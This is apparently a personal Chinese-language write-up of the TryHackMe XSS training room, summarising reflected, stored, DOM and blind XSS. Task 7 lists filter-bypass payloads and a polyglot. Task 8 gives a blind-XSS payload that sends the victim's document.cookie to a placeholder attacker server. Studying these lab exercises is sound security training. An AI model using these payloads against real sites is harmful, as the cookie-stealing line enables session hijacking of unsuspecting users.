> https://tryhackme.com/room/xssgi
> #Offensive #Web-Hacking #XSS

# Task 1 Room Brief

前置介绍，介绍了XSS（跨站脚本注入攻击），基本都是初步的介绍，没有深入讲述原理和攻击手法

# Task 2 XSS Payloads

简单介绍了XSS基本的负载类型
![[Pasted image 20221221212957.png]]

# Task 3 Reflected XSS

介绍了反射型XSS
![[Pasted image 20221221213147.png]]

# Task 4 Stored XSS

介绍了储存型XSS
![[Pasted image 20221221213409.png]]

# Task 5 DOM Based XSS

介绍了基于 DOM 的 XSS
![[Pasted image 20221221213643.png]]

# Task 6 Blind XSS

介绍了盲XSS，以及一个工具[xsshunter](https://xsshunter.com/)
![[Pasted image 20221221214021.png]]

# Task 7 Perfecting your payload

```plaintext
# level1
<script>alert('THM');</script>

# level2 类似于php中的提前闭合漏洞
"><script>alert('THM');</script> 

# level3 类似与level2，是直接提前闭合标签
</textarea><script>alert('THM');</script>

# level4 介绍了如何在Javascript中实现绕过，从而打成XSS
</textarea><script>alert('THM');</script>

# level5 网站过滤了script这一单词，所以只要简单做一个套娃复写就好
<sscriptcript>alert('THM');</sscriptcript>

# level6 之前的提前闭合等操作不起作用，所以可以使用img标签自带的onload属性
/images/cat.jpg" onload="alert('THM');
```

同时还介绍了`Polyglots`：
```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

# Task 8 Practical Example (Blind XSS)

一个示例，演示了盲XSS的攻击过程
```plaintext
# Example Payload
</textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
```
通过`</textarea>`闭合标签之后，每一次访问，都会将`document.cookie`输出到我们的服务器上（等就完事了）（怪，我没等到）
应该是Python开http.server的问题
![[Pasted image 20221221222623.png]]